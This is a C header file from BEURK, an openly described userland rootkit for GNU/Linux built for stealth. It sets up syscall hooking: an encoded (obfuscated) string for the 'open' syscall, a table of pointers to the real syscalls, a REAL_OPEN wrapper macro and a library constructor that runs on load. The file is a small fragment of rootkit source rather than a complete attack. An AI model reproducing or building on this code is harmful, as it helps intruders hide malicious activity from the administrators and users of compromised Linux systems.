/*
 * BEURK is an userland rootkit for GNU/Linux, focused around stealth.
 * Copyright (C) 2015  unix-thrust
 *
 * This file is part of BEURK.
 *
 * BEURK is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * BEURK is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with BEURK.  If not, see <http://www.gnu.org/licenses/>.
 */

#pragma once

#include "config.h"
#include "debug.h"

/* library constructor */

# define LENGTH_SYSCALL	8
# define SYSCALL_OPEN	"\x91\x8e\x9b\x90"
# define NUM_SYSCALL	1
# define SYS_OPEN		0

# define REAL_OPEN(args...) (beurk_syscalls_list[SYS_OPEN](args))

static char		*beurk_syscalls_table[NUM_SYSCALL] = {
	SYSCALL_OPEN
};

static void		*(*beurk_syscalls_list[NUM_SYSCALL])();

static void     init(void) __attribute__((constructor));
